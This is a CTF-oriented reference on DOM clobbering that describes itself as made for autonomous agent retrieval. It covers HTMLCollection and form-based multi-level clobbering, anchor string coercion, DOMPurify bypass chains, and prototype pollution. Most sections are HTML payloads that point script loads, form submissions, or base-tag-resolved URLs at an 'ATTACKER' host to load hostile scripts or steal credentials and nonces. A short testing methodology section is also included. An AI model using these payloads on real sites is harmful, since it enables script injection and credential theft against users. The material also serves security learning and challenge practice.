# DOM Clobbering - CTF Reference

> **Document Purpose:** Actionable DOM clobbering techniques for CTF challenges. Covers named element access, multi-level clobbering, string coercion, DOMPurify bypass, prototype pollution via clobbering, common attack targets, form action hijack, and base tag hijack for autonomous agent retrieval.

---

## 1. DOM Clobbering Fundamentals

> **When to use this section:** You can inject HTML (but not JavaScript) into a page, and the page's JavaScript references global variables or `document` properties that you can override with named HTML elements.

**Tags:** `dom-clobbering, html-injection, xss, csp-bypass, fundamentals`

**What Is DOM Clobbering:**
- HTML elements with `id` or `name` attributes automatically create properties on `window` and `document`
- This can override undefined JavaScript variables, function references, or configuration objects
- Works even when CSP blocks all inline and external scripts, because no JavaScript injection is needed -- only HTML
- Exploitable whenever application code accesses `window.X` or `document.X` without checking if it is a DOM element

**Named Element Access Rules:**
```html
<!-- id attribute creates window.myElement -->
<div id="myElement">clobbered</div>
<script>
console.log(window.myElement);     // <div id="myElement">
console.log(myElement);            // <div id="myElement"> (implicit window lookup)
</script>

<!-- name attribute on certain elements creates document.myForm -->
<form name="myForm"></form>
<script>
console.log(document.myForm);     // <form name="myForm">
</script>

<!-- Both id and name work for embed, object, img, form, iframe -->
<img id="x" name="y" src="">
<script>
console.log(window.x);            // <img id="x">
console.log(document.y);          // <img id="x" name="y">
</script>
```

**Elements That Create Named Properties:**
| Attribute | Scope       | Elements |
|-----------|-------------|----------|
| `id`      | `window`    | All HTML elements |
| `name`    | `document`  | `form`, `img`, `embed`, `object`, `iframe`, `applet` |
| `name`    | `window`    | `embed`, `object`, `iframe` (in some browsers) |

---

## 2. Multi-Level DOM Clobbering

> **When to use this section:** The target JavaScript accesses nested properties like `config.url` or `settings.api.endpoint`, requiring you to clobber multiple levels deep.

### 2.1 HTMLCollection via Duplicate IDs

**Tags:** `dom-clobbering, html-collection, multi-level, nested-property`

**Concept:** When multiple elements share the same `id`, `document.getElementById` returns the first one, but `window[id]` returns an `HTMLCollection`. HTMLCollection items are accessible by index or by `name` attribute, enabling two-level clobbering.

```html
<!-- Clobber window.config.url -->
<a id="config" name="url" href="https://ATTACKER/evil.js">click</a>
<a id="config" name="key" href="secret">click</a>

<script>
// window.config is an HTMLCollection (because two elements have id="config")
// window.config.url returns the <a> element with name="url"
// String(window.config.url) returns the href due to <a> toString()
console.log(window.config);          // HTMLCollection(2)
console.log(window.config.url);      // <a id="config" name="url" href="...">
console.log(String(window.config.url));  // "https://ATTACKER/evil.js"
</script>
```

### 2.2 Form + Input Nesting

**Tags:** `dom-clobbering, form-input, nested, multi-level, named-access`

**Concept:** A `<form>` element exposes its child inputs as named properties. `form.inputName` returns the input element. Combined with `id` on the form, this gives `window.formId.inputName`.

```html
<!-- Clobber window.config.apiUrl -->
<form id="config">
    <input name="apiUrl" value="https://ATTACKER/evil">
    <input name="debug" value="true">
    <input name="version" value="99">
</form>

<script>
console.log(window.config.apiUrl);       // <input name="apiUrl" value="...">
console.log(window.config.apiUrl.value); // "https://ATTACKER/evil"
console.log(window.config.debug.value);  // "true"
</script>
```

**Important:** Accessing `.value` gives the string, but accessing the element directly gives an `HTMLInputElement`. This matters depending on how the target code uses the clobbered value.

### 2.3 Fieldset Nesting for Three Levels

**Tags:** `dom-clobbering, fieldset, three-level, deep-nesting`

**Concept:** `<fieldset>` elements also expose named child elements, and can be nested inside forms for deeper clobbering.

```html
<!-- Clobber window.app.config.url (three levels) -->
<form id="app">
    <fieldset name="config" form="app">
        <input name="url" value="https://ATTACKER/">
    </fieldset>
</form>

<script>
// In some browser versions:
console.log(window.app.config.url);  // <input name="url">
</script>
```

**Note:** Three-level clobbering via fieldset is browser-dependent and less reliable. The HTMLCollection + `<a>` technique in Section 2.1 is more portable.

### 2.4 iframe + srcdoc for Deep Clobbering

**Tags:** `dom-clobbering, iframe, srcdoc, contentwindow, deep`

**Concept:** If iframes are allowed, `<iframe name="X">` creates `window.X` pointing to the iframe's `contentWindow`, which can contain further clobbered elements.

```html
<iframe name="config" srcdoc="<a id='url' href='https://ATTACKER/'>"></iframe>

<script>
// window.config is the iframe's contentWindow
// window.config.url is the <a> element inside the iframe
// String coercion gives the href
setTimeout(() => {
    console.log(String(window.config.url));  // "https://ATTACKER/"
}, 100);  // Need timeout for iframe to load
</script>
```

---

## 3. String Coercion via Anchor Elements

> **When to use this section:** The target code converts a DOM element to a string (e.g., template literals, string concatenation, `.toString()`). Anchor (`<a>`) elements are special because their `.toString()` returns the `href` URL.

**Tags:** `dom-clobbering, string-coercion, anchor, href, tostring`

**Concept:** `HTMLAnchorElement.prototype.toString()` returns the full URL from the `href` attribute. This is the key to making clobbered values behave like strings.

**Basic String Coercion:**
```html
<a id="scriptUrl" href="https://ATTACKER/evil.js">x</a>

<script>
// When code does: fetch(scriptUrl) or element.src = scriptUrl
// The <a> element is coerced to string via toString()
console.log(`${window.scriptUrl}`);        // "https://ATTACKER/evil.js"
console.log(window.scriptUrl + '');        // "https://ATTACKER/evil.js"
console.log(String(window.scriptUrl));     // "https://ATTACKER/evil.js"
console.log('' + window.scriptUrl);        // "https://ATTACKER/evil.js"
</script>
```

**Multi-Level with String Coercion:**
```html
<!-- Clobber window.config.cdnUrl to attacker URL -->
<a id="config" name="cdnUrl" href="https://ATTACKER/malicious.js">x</a>
<a id="config" name="apiBase" href="https://ATTACKER/api">x</a>

<script>
// Code that does: loadScript(config.cdnUrl)
// config is HTMLCollection, config.cdnUrl is <a>, toString() gives href
const url = `${window.config.cdnUrl}`;  // "https://ATTACKER/malicious.js"
</script>
```

**Area Elements Also Work:**
```html
<!-- <area> also has toString() returning href -->
<map name="config">
    <area id="config" name="url" href="https://ATTACKER/">
</map>
```

**When String Coercion Fails:**
- Direct property access without string conversion: `obj.property` returns the element, not a string
- Strict equality checks: `config.debug === true` fails because element !== boolean
- JSON.stringify: Returns `undefined` for DOM elements (not serializable)

---

## 4. DOMPurify Bypass via DOM Clobbering

> **When to use this section:** The application sanitizes HTML with DOMPurify but the sanitized output is used in a context where DOM clobbering can override critical variables.

**Tags:** `dom-clobbering, dompurify, sanitizer-bypass, html-injection, xss`

### 4.1 DOMPurify Allows Clobbering by Default

**Key Insight:** DOMPurify (by default) allows `id` and `name` attributes on most elements. It removes event handlers and `<script>` tags, but it does NOT prevent DOM clobbering.

```html
<!-- This passes DOMPurify sanitization -->
<a id="config" name="url" href="https://ATTACKER/evil.js">link</a>
<a id="config" name="debug" href="true">link</a>
<form id="settings"><input name="admin" value="true"></form>
```

**DOMPurify with SANITIZE_DOM:**
```javascript
// DOMPurify has a SANITIZE_DOM option that mitigates SOME clobbering
const clean = DOMPurify.sanitize(dirty, { SANITIZE_DOM: true });
// With SANITIZE_DOM: true, DOMPurify removes id/name that conflict with
// document properties (like "cookie", "domain", "forms")
// But it does NOT remove arbitrary custom names like "config", "settings", etc.
```

### 4.2 Clobbering DOMPurify Itself

**Tags:** `dom-clobbering, dompurify, self-clobber, bypass`

**Older DOMPurify versions** were vulnerable to being clobbered during sanitization if the dirty HTML contained elements that overrode properties DOMPurify relied on.

```html
<!-- Historical bypass (fixed in DOMPurify 2.x+) -->
<!-- Clobber document.createElement or other DOM APIs during sanitization -->
<img id="createElement" name="createElement">
```

**Modern DOMPurify** (3.x) is hardened against self-clobbering, but the sanitized output can still clobber the parent page's globals.

### 4.3 Exploitation Chain: DOMPurify + Clobbering = XSS

**Tags:** `dom-clobbering, dompurify, exploitation-chain, script-gadget`

**Scenario:** Application sanitizes user HTML with DOMPurify, inserts it into the page, then runs JavaScript that references `window.CONFIG` or similar:

```javascript
// Application code (runs after sanitized HTML is inserted)
const scriptSrc = window.CONFIG?.cdnUrl || '/default/app.js';
const s = document.createElement('script');
s.src = scriptSrc;
document.body.appendChild(s);
```

**Attack:**
```html
<!-- Injected HTML (passes DOMPurify) -->
<a id="CONFIG" name="cdnUrl" href="https://ATTACKER/evil.js">X</a>
<a id="CONFIG">X</a>

<!-- After insertion, window.CONFIG is an HTMLCollection -->
<!-- window.CONFIG.cdnUrl.toString() returns "https://ATTACKER/evil.js" -->
<!-- Application loads attacker's script! -->
```

---

## 5. Prototype Pollution via DOM Clobbering

> **When to use this section:** You can clobber an object that is later used in a merge/assign operation, enabling prototype pollution through DOM clobbering.

**Tags:** `dom-clobbering, prototype-pollution, chain, merge, gadget`

**Concept:** If clobbered DOM elements are passed to a recursive merge function that does not check for DOM nodes, properties like `__proto__` from named elements can trigger prototype pollution.

**Exploitation Chain:**
```html
<!-- Step 1: Clobber a config object with __proto__ -->
<form id="config">
    <input name="__proto__" value="">
    <fieldset name="__proto__" form="config">
        <input name="isAdmin" value="true">
    </fieldset>
</form>
```

```javascript
// Step 2: Application merges clobbered config into real object
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

// If source is the clobbered form element:
// form["__proto__"] returns the fieldset
// Iterating the fieldset yields input[name="isAdmin"]
// This can pollute Object.prototype.isAdmin
```

**Note:** This is a complex chain requiring specific application behavior. More commonly seen in advanced CTFs that combine HTML injection with prototype pollution.

---

## 6. Common Attack Targets

> **When to use this section:** You have confirmed DOM clobbering capability and need to identify high-value targets in the application's JavaScript.

**Tags:** `dom-clobbering, attack-targets, config, cdn, feature-flags`

### 6.1 Configuration Objects

**Tags:** `dom-clobbering, config-object, settings, options`

```javascript
// Vulnerable patterns in application code:
const apiUrl = window.API_URL || 'https://default-api.com';
const config = window.CONFIG || { debug: false };
const settings = globalThis.SETTINGS;

// If these globals are undefined, clobbering creates them
```

**Common Config Variable Names to Clobber:**
```
window.CONFIG, window.config, window.SETTINGS, window.settings
window.API_URL, window.API_BASE, window.BASE_URL
window.CDN_URL, window.ASSET_URL, window.STATIC_URL
window.DEBUG, window.ENV, window.MODE
window.APP, window.app, window.APPLICATION
window.AUTH, window.TOKEN, window.SESSION
```

### 6.2 CDN and Script URLs

**Tags:** `dom-clobbering, cdn-url, script-src, gadget`

The most dangerous clobbering target is a URL used for script loading:

```javascript
// Vulnerable: loads script from clobberable global
const cdnBase = window.CDN_BASE || 'https://cdn.example.com';
const script = document.createElement('script');
script.src = `${cdnBase}/app.bundle.js`;  // String coercion triggers <a>.toString()
document.head.appendChild(script);
```

**Clobber Payload:**
```html
<a id="CDN_BASE" href="https://ATTACKER/">x</a>
<!-- Result: script loads from https://ATTACKER/app.bundle.js -->
```

### 6.3 Feature Flags and Debug Mode

**Tags:** `dom-clobbering, feature-flags, debug, bypass`

```javascript
// Clobber to enable debug mode
if (window.DEBUG) { console.log(sensitiveData); }

// Clobber to disable security features
if (!window.CSRF_ENABLED) { skipCsrfCheck(); }
```

```html
<div id="DEBUG">enabled</div>
<!-- window.DEBUG is now truthy (it's an HTMLDivElement) -->
```

**Truthiness of DOM Elements:**
- All DOM elements are truthy in boolean context
- `if (window.X)` will be true if `X` is clobbered to any element
- `if (window.X === true)` will be false (element !== boolean)
- `if (window.X == true)` will be false (no type coercion match)

---

## 7. Form Action Hijack

> **When to use this section:** The page contains a form, and you can inject HTML before or inside it to change where the form submits data (including credentials or tokens).

**Tags:** `dom-clobbering, form-action, hijack, credential-theft, phishing`

### 7.1 Overriding Form Action

**Concept:** If you can inject an `<input>` or `<button>` element inside a form with `name="action"`, it clobbers `form.action`, potentially changing the submission URL.

```html
<!-- Original form -->
<form id="loginForm" action="/login">
    <!-- Attacker injects inside the form: -->
    <input name="action" value="https://ATTACKER/steal-creds">
    <!-- This clobbers form.action: -->
    <!-- loginForm.action returns the <input> element instead of "/login" -->
    <input type="text" name="username">
    <input type="password" name="password">
    <button type="submit">Login</button>
</form>
```

**Note:** Whether this actually redirects the form depends on how the application handles submission. Native form submission uses the `action` HTML attribute, but JavaScript that reads `form.action` will get the clobbered value.

### 7.2 formaction Attribute

**Tags:** `dom-clobbering, formaction, button, submit-hijack`

```html
<!-- formaction on a submit button overrides the form's action -->
<form action="/safe-endpoint">
    <input type="text" name="secret">
    <!-- Injected button that overrides action when clicked -->
    <button type="submit" formaction="https://ATTACKER/steal">Submit</button>
</form>
```

**Combined with Autofocus/Enter Key:**
```html
<!-- If the user presses Enter, the first submit button is activated -->
<form action="/login">
    <!-- Injected first, so it takes precedence for Enter key submission -->
    <button type="submit" formaction="https://ATTACKER/steal" style="position:absolute;left:-9999px">
    </button>
    <!-- Original form content follows -->
    <input type="text" name="token" value="secret123">
    <button type="submit">Real Submit</button>
</form>
```

---

## 8. Base Tag Hijack

> **When to use this section:** You can inject a `<base>` tag to change the base URL for all relative URLs on the page, affecting script loads, form actions, and link destinations.

**Tags:** `dom-clobbering, base-tag, hijack, relative-url, script-load`

**Concept:** The `<base href="...">` tag changes the base URL used to resolve all relative URLs on the page. If injected before the page's scripts and links, it redirects them to attacker-controlled resources.

**Base Tag Script Hijack:**
```html
<!-- Injected base tag -->
<base href="https://ATTACKER/">

<!-- Original page has: -->
<script src="/js/app.js"></script>
<!-- Now resolves to: https://ATTACKER/js/app.js -->

<link rel="stylesheet" href="/css/style.css">
<!-- Now resolves to: https://ATTACKER/css/style.css -->

<a href="/profile">Profile</a>
<!-- Now resolves to: https://ATTACKER/profile -->
```

**CSP Consideration:**
- If CSP has `base-uri 'self'` or `base-uri 'none'`, base tag injection is blocked
- If CSP lacks a `base-uri` directive entirely, base tag injection works
- Many applications forget to include `base-uri` in their CSP

**Base Tag + Nonce Exfiltration:**
```
Step 1: Inject <base> tag changing base URL to attacker server
Step 2: Page loads relative script <script nonce="SECRET" src="/js/app.js">
Step 3: Browser requests https://ATTACKER/js/app.js
Step 4: Attacker serves malicious JS that is accepted because the original nonce is on the tag
Note: This bypasses nonce-based CSP if base-uri is missing!
```

**Dangling Markup + Base:**
```html
<!-- Inject base tag with a trailing path that captures subsequent HTML -->
<base href="https://ATTACKER/exfil?data=
<!-- Page content including secrets becomes part of the URL -->
```

---

## 9. Detection and Testing Methodology

> **When to use this section:** Systematically testing a target application for DOM clobbering vulnerabilities.

**Tags:** `dom-clobbering, detection, testing, methodology, audit`

**Step 1: Identify HTML Injection Points**
```
- User-generated content (comments, posts, profiles)
- HTML email rendering
- Markdown rendering with HTML support
- Template injection with HTML output
- URL fragments reflected in page
```

**Step 2: Identify JavaScript Global References**
```javascript
// Search application JavaScript for patterns like:
window.CONFIG
window.SETTINGS
window.API_URL
globalThis.X
typeof X !== 'undefined'
X || defaultValue
document.getElementById('X')  // less exploitable but worth noting
```

**Step 3: Check Sanitizer Configuration**
```
- Does DOMPurify allow id and name attributes? (default: yes)
- Is SANITIZE_DOM enabled? (only blocks document property collisions)
- Are <form>, <a>, <input> tags allowed?
- Is <base> tag allowed?
```

**Step 4: Test Clobbering**
```html
<!-- Inject and verify -->
<div id="TEST_CLOBBER">clobbered</div>
<!-- Then check: does window.TEST_CLOBBER exist in console? -->

<!-- Test multi-level -->
<a id="TEST_CONFIG" name="url" href="https://evil.com">x</a>
<a id="TEST_CONFIG">x</a>
<!-- Check: String(window.TEST_CONFIG.url) -->
```

**Step 5: Identify Gadgets**
```
Look for code paths where clobbered values lead to:
1. Script loading (src attribute assignment)
2. URL redirection (location.href assignment)
3. innerHTML assignment (XSS)
4. fetch/XMLHttpRequest URL (SSRF or data exfiltration)
5. eval() or Function() calls
6. Security checks being bypassed (feature flags)
```

---

## 10. Common CTF Patterns

> **When to use this section:** Solving DOM clobbering challenges in CTF competitions.

**Tags:** `dom-clobbering, ctf, patterns, xss, csp-bypass`

**Pattern 1: Script Gadget under Strict CSP**
```
Challenge: CSP blocks inline scripts and all script-src except 'self'
Setup: HTML injection allowed (sanitized by DOMPurify)
Goal: Execute JavaScript despite CSP
Technique:
  1. Find a JS file on the same origin that reads a global variable for a URL
  2. Clobber that global with <a> pointing to attacker domain
  3. The existing trusted script loads attacker's code
  4. Bypasses CSP because the <script> tag already has 'self' or a nonce
```

**Pattern 2: Credential Theft via Form Hijack**
```
Challenge: Admin bot fills in and submits a login form
Setup: HTML injection in the same page as the form
Goal: Steal the admin's password
Technique:
  1. Inject <button type=submit formaction="https://ATTACKER/steal">
  2. Or inject <base href="https://ATTACKER/">
  3. Admin bot submits form, credentials sent to attacker
```

**Pattern 3: Feature Flag Override**
```
Challenge: Application has hidden admin panel behind feature flag
Setup: window.ENABLE_ADMIN checked in JavaScript
Goal: Access admin functionality
Technique: Inject <div id="ENABLE_ADMIN">1</div>
  - window.ENABLE_ADMIN is now truthy
  - Application enables admin features
```

**Pattern 4: CDN URL Override**
```
Challenge: Application loads scripts from CDN URL stored in global
Setup: window.CDN_URL || "https://cdn.example.com" pattern in code
Goal: Load attacker's script
Technique:
  <a id="CDN_URL" href="https://ATTACKER/">x</a>
  Application's template literal: `${CDN_URL}/bundle.js`
  Loads: https://ATTACKER/bundle.js
```

**Pattern 5: Clobbering + Prototype Pollution Chain**
```
Challenge: Application merges config from DOM-clobbered global
Setup: merge(defaults, window.userConfig) in application code
Goal: Achieve prototype pollution then RCE
Technique:
  1. Clobber window.userConfig with form/input elements
  2. Include __proto__ named elements
  3. Merge function traverses into __proto__
  4. Object.prototype polluted -> template engine RCE
```

**CTF Playbook:**
1. Find HTML injection that survives sanitization (check if `id`/`name` attributes are kept)
2. Read the page's JavaScript to find references to undefined globals
3. Trace how those globals are used (URL loading, config, flags)
4. Craft clobbering HTML using `<a>` for string coercion or `<form>` for nested access
5. For script loading gadgets: use `<a id="X" href="https://ATTACKER/">` and host payload
6. For boolean flags: any element with that `id` makes it truthy
7. Check if `<base>` tag is allowed and CSP lacks `base-uri`
8. Test in the same browser the admin bot uses (usually Chromium)

---

## 11. Agent Takeaway

> - DOM clobbering is the primary technique for achieving code execution when HTML injection is possible but JavaScript injection is blocked (CSP or sanitizer)
> - The `<a>` element is the most powerful clobbering primitive because `.toString()` returns the `href` URL, enabling string coercion in template literals and concatenation
> - Multi-level clobbering uses HTMLCollection (duplicate IDs) + `name` attribute to access `window.X.Y`
> - DOMPurify allows `id` and `name` attributes by default; clobbering payloads survive standard sanitization
> - Always search the target's JavaScript for global variable references (`window.X`, `globalThis.X`, bare `X || default`)
> - Script loading gadgets (where a global URL is used in script.src) are the highest-impact clobbering targets
> - `<base>` tag injection is a powerful complement to clobbering; check for missing `base-uri` in CSP
> - Form action hijacking via `formaction` or `<base>` can steal credentials from admin bots that fill forms
> - In CTF challenges, look for the pattern: sanitized HTML insertion + JavaScript that reads globals + script loading or security check bypass
> - Test clobbering payloads in the browser console first: inject the HTML, then verify `window.X` returns the expected value
